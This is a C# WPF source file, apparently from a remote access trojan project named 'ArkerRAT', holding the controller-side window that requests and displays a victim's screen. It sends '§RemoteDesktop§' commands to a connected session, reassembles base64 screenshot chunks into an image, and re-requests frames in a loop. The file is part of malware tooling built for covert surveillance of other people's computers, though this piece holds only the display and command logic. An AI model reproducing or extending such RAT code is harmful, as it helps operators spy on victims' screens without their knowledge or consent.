using ArkerRAT1;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace ArkerRatWpfVersion
{
    /// <summary>
    /// Interaction logic for RemoteDesktopWindow.xaml
    /// </summary>
    public partial class RemoteDesktopWindow : Window
    {
        public RATHostSession clientSession { get; set; }

        public RemoteDesktopWindow(RATHostSession session)
        {
            InitializeComponent();
            clientSession = session;
            clientSession.remoteDesktopWindowIsAlreadyOpen = true;
            clientSession.SendData("§RemoteDesktop§");
        }

        private async void CloseWindow(object sender, RoutedEventArgs e)
        {
            clientSession.base64strings.Clear();
            clientSession.base64strings.Clear();
            clientSession.remoteDesktopWindowIsAlreadyOpen = false;
            Close();
        }

        private void MaximizeWindow(object sender, RoutedEventArgs e)
        {

        }

        private void MinimizeWindow(object sender, RoutedEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }

        private void Window_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (e.LeftButton == MouseButtonState.Pressed)
            {
                DragMove();
            }
        }
        //_______________________________________________________________________________
        List<byte> base64bytes = new List<byte>();
        public async Task RemoteDesktopFunction()
        {
                string[] base64StringArray = clientSession.base64strings.ToArray();

                string concatenatedBase64String = string.Join("", base64StringArray).Replace("§RemoteDesktopFrameDone§", string.Empty);

                string[] concatenatedBase64StringArray = concatenatedBase64String.Split(new string[] { "§RemoteDesktop§" }, StringSplitOptions.RemoveEmptyEntries);

                foreach (string base64StringText in concatenatedBase64StringArray)
                {

                    if (IsValidBase64String(base64StringText))
                    {
                        byte[] tempByteArray = Convert.FromBase64String(base64StringText);
                        // Add the bytes to the list
                        foreach (byte bytes in tempByteArray)
                        {
                            base64bytes.Add(bytes);
                        }
                }
            }

            //Thread safe way of making the image
            var bitmapImage = new BitmapImage();
            try
            {
                using (var memoryStream = new MemoryStream(base64bytes.ToArray()))
                {
                    bitmapImage.BeginInit();
                    bitmapImage.CacheOption = BitmapCacheOption.OnLoad;
                    bitmapImage.StreamSource = memoryStream;
                    bitmapImage.EndInit();
                    bitmapImage.Freeze();
                }
            }

                
            catch (Exception ex)
            {
                base64bytes.Clear();
                clientSession.base64strings.Clear();
                await clientSession.SendData("§RemoteDesktop§§Close§");
                await clientSession.SendData("§RemoteDesktop§");
            }



            await Dispatcher.BeginInvoke(new Action(() =>
                {
                    remoteDesktopVideoFrame.Source = bitmapImage;
                }));

            // Clear the list of base64 strings
            await clientSession.SendData("§RemoteDesktop§");
            base64bytes.Clear();
            clientSession.base64strings.Clear();
        }

        private bool IsValidBase64String(string base64String)
        {
            // Check if the string is null or empty, or if its length is not divisible by 4
            if (string.IsNullOrEmpty(base64String) || base64String.Length % 4 != 0)
            {
                return false;
            }

            // Check if the string contains any whitespaces, tabs, or newlines
            if (base64String.Contains(" ") || base64String.Contains("\t") || base64String.Contains("\r") || base64String.Contains("\n"))
            {
                return false;
            }

            try
            {
                // Try to convert the string to bytes
                Convert.FromBase64String(base64String);
                return true;
            }
            catch (FormatException)
            {
                // If the conversion fails, the string is not a valid base64 string
                return false;
            }
        }
    }
}
